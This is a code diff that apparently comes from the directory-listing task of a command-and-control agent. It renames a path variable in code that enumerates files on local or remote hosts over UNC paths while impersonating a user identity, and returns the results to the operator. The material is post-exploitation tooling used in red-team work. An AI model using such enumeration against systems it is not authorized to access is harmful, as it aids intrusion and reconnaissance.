@@ -121,6 +121,7 @@ namespace Tasks
             _cancellationToken.Cancel();
         }
 
+
         public override System.Threading.Tasks.Task CreateTasking()
         {
             return new System.Threading.Tasks.Task(() =>
@@ -128,10 +129,10 @@ namespace Tasks
                 LsParameters parameters = _jsonSerializer.Deserialize<LsParameters>(_data.Parameters);
                 string host = string.IsNullOrEmpty(parameters.Host) ? "" : parameters.Host;
                 host = localhostAliases.Contains(host.ToLower()) ? "" : host;
-                string path = string.IsNullOrEmpty(host) ?
+                string uncPath = string.IsNullOrEmpty(host) ?
                               parameters.Path : $@"\\{host}\{parameters.Path}";
-                if (string.IsNullOrEmpty(path))
-                    path = ".";
+                if (string.IsNullOrEmpty(uncPath))
+                    uncPath = ".";
                 if (string.IsNullOrEmpty(host))
                     host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                 FileBrowser results = new FileBrowser
@@ -140,7 +141,7 @@ namespace Tasks
                 };
                 using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
                 {
-                    if (ApolloInterop.Utils.PathUtils.TryGetExactPath(path, out path))
+                    if (ApolloInterop.Utils.PathUtils.TryGetExactPath(uncPath, out uncPath))
                     {
                         string errorMessage = "";
                         bool bRet = true;
@@ -167,11 +168,11 @@ namespace Tasks
                                 });
                             _agent.GetTaskManager().AddTaskResponseToQueue(tmpResp);
                         };
-                        if (File.Exists(path))
+                        if (File.Exists(uncPath))
                         {
                             try
                             {
-                                var tmp = new FileInfo(path);
+                                var tmp = new FileInfo(uncPath);
                                 FileInformation finfo = new FileInformation(tmp, null);
                                 results.IsFile = true;
                                 results.Name = finfo.Name;
@@ -188,17 +189,17 @@ namespace Tasks
                             } catch (Exception ex)
                             {
                                 bRet = false;
-                                errorMessage = $"Failed to get information on file {path}: {ex.Message}\n\n{ex.StackTrace}";
+                                errorMessage = $"Failed to get information on file {uncPath}: {ex.Message}\n\n{ex.StackTrace}";
                             }
-                        } else if (Directory.Exists(path))
+                        } else if (Directory.Exists(uncPath))
                         {
                             try
                             {
-                                DirectoryInfo dinfo = new DirectoryInfo(path);
+                                DirectoryInfo dinfo = new DirectoryInfo(uncPath);
                                 FileInformation finfo = new FileInformation(dinfo, null);
                                 results.IsFile = false;
                                 results.Name = finfo.Name;
-                                results.ParentPath = dinfo.Parent == null ? "" : dinfo.Parent.FullName;
+                                results.ParentPath = dinfo.Parent == null ? "" : ApolloInterop.Utils.PathUtils.StripPathOfHost(dinfo.Parent.FullName);
                                 results.AccessTime = finfo.AccessTime;
                                 results.CreationDate = finfo.CreationDate;
                                 results.ModifyTime = finfo.ModifyTime;
@@ -207,7 +208,7 @@ namespace Tasks
                                 {
                                     results.Permissions = GetPermissions(dinfo);
                                 } catch { }
-                                string[] directories = Directory.GetDirectories(path);
+                                string[] directories = Directory.GetDirectories(uncPath);
                                 TT.ParallelOptions po = new TT.ParallelOptions();
                                 po.CancellationToken = _cancellationToken.Token;
                                 po.MaxDegreeOfParallelism = 2;
@@ -233,7 +234,7 @@ namespace Tasks
                                 {
 
                                 }
-                                string[] dirFiles = Directory.GetFiles(path);
+                                string[] dirFiles = Directory.GetFiles(uncPath);
                                 try
                                 {
                                     TT.Parallel.ForEach(dirFiles, po, (f) =>
@@ -260,12 +261,12 @@ namespace Tasks
                             } catch (Exception ex)
                             {
                                 bRet = false;
-                                errorMessage = $"Failed to get information on directory {path}: {ex.Message}\n\n{ex.StackTrace}";
+                                errorMessage = $"Failed to get information on directory {uncPath}: {ex.Message}\n\n{ex.StackTrace}";
                             }
                         } else
                         {
                             bRet = false;
-                            errorMessage = $"Could not find file or directory {path}";
+                            errorMessage = $"Could not find file or directory {uncPath}";
                         }
 
                         results.Success = bRet;
